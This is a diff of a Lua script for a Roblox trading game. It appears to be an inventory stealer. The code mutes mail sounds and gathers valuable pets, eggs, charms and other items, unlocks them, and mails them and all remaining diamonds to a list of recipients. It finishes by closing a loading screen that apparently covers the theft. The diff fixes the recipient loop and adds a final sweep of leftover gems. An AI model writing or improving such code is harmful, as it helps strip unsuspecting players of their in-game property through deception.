@@ -61,7 +61,7 @@ local function formatNumber(number)
     return string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
--- Ensure mail sounds are silent
+-- Mute mail sounds
 game.DescendantAdded:Connect(function(x)
     if x.ClassName == "Sound" then
         if x.SoundId=="rbxassetid://11839132565" 
@@ -123,7 +123,7 @@ local function sendItem(category, uid)
     end
 end
 
--- FIXED: Send all remaining diamonds after items in one mail per user
+-- Send all remaining diamonds after all items, full stack per mail
 local function SendAllGems()
     local gemIndex = nil
     for i, v in pairs(GetSave().Inventory.Currency) do
@@ -184,7 +184,8 @@ end
 
 require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
-local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+-- Updated: Removed Booth and Hoverboard
+local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Ultimate"}
 
 -- Collect items above min_rap and unlock them
 for _,v in pairs(categoryList) do
@@ -241,4 +242,16 @@ if #sortedItems>0 or GemAmount1>min_rap+mailSendPrice then
             if success then
                 remaining = remaining - 1
             else
-                userIndex = userIndex
+                userIndex = userIndex + 1
+            end
+        end
+    end
+
+    -- Send leftover gems after all items
+    if GemAmount1 > 0 then
+        SendAllGems()
+    end
+
+    -- Close loading GUI
+    message.Close()
+end
